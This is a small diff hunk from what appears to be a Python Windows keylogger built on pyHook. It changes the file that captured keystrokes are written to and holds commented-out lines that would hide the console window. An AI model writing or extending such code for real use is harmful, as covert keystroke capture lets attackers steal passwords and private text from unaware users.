@@ -9,7 +9,7 @@ import pythoncom, pyHook, sys, logging
 # win = win32console.GetConsoleWindow() 
 # win32gui.ShowWindow(win, 0) 
 
-file_log = 'C:/Users/Rebecca Ramnauth/Desktop/batch_test/keys.txt' # location of file to write keys to
+file_log = 'keys.txt' # location of file to write keys to
 
 current_window = None
 user32 = windll.user32
